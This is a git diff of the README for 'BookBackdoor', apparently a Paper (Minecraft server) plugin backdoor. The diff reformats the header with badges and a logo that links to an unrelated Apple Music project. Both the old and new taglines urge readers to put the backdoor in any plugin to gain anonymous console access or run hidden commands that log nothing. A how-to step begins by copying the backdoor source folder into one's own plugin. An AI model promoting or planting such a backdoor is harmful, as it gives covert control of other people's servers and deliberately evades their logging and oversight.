@@ -1,6 +1,15 @@
-# BookBackdoor ![BookBackdoor](https://github.com/BookBackdoor/BookBackdoor/actions/workflows/maven-publish.yml/badge.svg)
+<p align="center">
+  <a href="https://github.com/cryptofyre/Apple-Music-Electron">
+    <img src="https://i.imgur.com/xZ4ujZm.png" alt="Logo" width="800" height="122">    
+  </a>
+</p>
 
-* Put this in any paper plugin to gain anonymous access to CONSOLE or execute custom build in command that log nothing!
+<p align="center">
+  <img src="https://github.com/BookBackdoor/BookBackdoor/actions/workflows/maven-publish.yml/badge.svg" alt="Build">
+  <img src="https://img.shields.io/github/license/BookBackdoor/BookBackdoor" alt="MIT">
+  <br>
+  Put this in any paper plugin to gain anonymous access to CONSOLE or execute custom build in command that logs nothing!
+</p>
 
 # How-to
 * 1: Copy the folder ```src/main/java/org/brandonplank/backdoor``` into your plugin
